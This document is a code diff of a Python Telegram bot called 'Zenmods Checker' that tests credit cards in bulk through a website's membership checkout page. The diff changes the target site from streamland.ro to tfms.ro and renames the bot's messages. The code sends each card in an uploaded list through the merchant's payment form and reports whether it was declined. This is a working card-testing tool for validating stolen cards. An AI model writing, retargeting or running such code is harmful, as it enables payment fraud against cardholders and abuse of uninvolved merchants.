@@ -80,12 +80,12 @@ def check_single_cc(cc_line):
 
         session = requests.Session()
 
-        # REQ1: Get Nonce
+        # REQ1: Get Nonce from tfms.ro
         headers = {
             'Content-Type': 'application/x-www-form-urlencoded',
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
         }
-        response = session.get('https://www.streamland.ro/membership-account/membership-checkout/', headers=headers, timeout=20)
+        response = session.get('https://tfms.ro/membership-account/membership-checkout/', headers=headers, timeout=20)
         if response.status_code != 200:
             return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: Checkout page GET failed (Status: {response.status_code})"
 
@@ -117,7 +117,7 @@ def check_single_cc(cc_line):
         
         id_ = token_res['id']
 
-        # REQ4: Checkout Submission
+        # REQ4: Checkout Submission to tfms.ro
         headers = {
             'Content-Type': 'application/x-www-form-urlencoded',
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
@@ -141,7 +141,7 @@ def check_single_cc(cc_line):
             'ExpirationYear': ano,
         }
 
-        checkout_res = session.post('https://www.streamland.ro/membership-account/membership-checkout/', headers=headers, data=data_checkout, timeout=20).text
+        checkout_res = session.post('https://tfms.ro/membership-account/membership-checkout/', headers=headers, data=data_checkout, timeout=20).text
         response_code = (BeautifulSoup(checkout_res, 'html.parser')).find(class_="pmpro_message pmpro_error", id='pmpro_message')
 
         error_message = response_code.get_text() if response_code else checkout_res
@@ -166,11 +166,10 @@ def process_bulk_file(chat_id, file_content):
         bot.send_message(chat_id, "⚠️ File is empty or no cards found!")
         return
 
-    bot.send_message(chat_id, f"⚡ **Zenmods Streamland Sequential Engine** ⚡\nTotal cards: `{total_cards}`.\n🚀 Checking strictly 1 by 1 in real-time...")
+    bot.send_message(chat_id, f"⚡ **Zenmods TFMS Sequential Engine** ⚡\nTotal cards: `{total_cards}`.\n🚀 Checking strictly 1 by 1 in real-time...")
 
     for index, card_line in enumerate(lines, start=1):
         res = check_single_cc(card_line)
-        # প্রতিটি কার্ড চেক শেষ হওয়া মাত্রই সিঙ্গেল মেসেজ সেন্ড করবে
         bot.send_message(chat_id, f"📌 **Result [{index}/{total_cards}]**:\n\n{res}")
         time.sleep(2)
 
@@ -178,7 +177,7 @@ def process_bulk_file(chat_id, file_content):
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    bot.reply_to(message, "Welcome to Zenmods Streamland Checker Bot! Send /auth <code > to authorize or upload a text file.")
+    bot.reply_to(message, "Welcome to Zenmods TFMS Checker Bot! Send /auth <code > to authorize or upload a text file.")
 
 @bot.message_handler(commands=['auth'])
 def authorize_user(message):
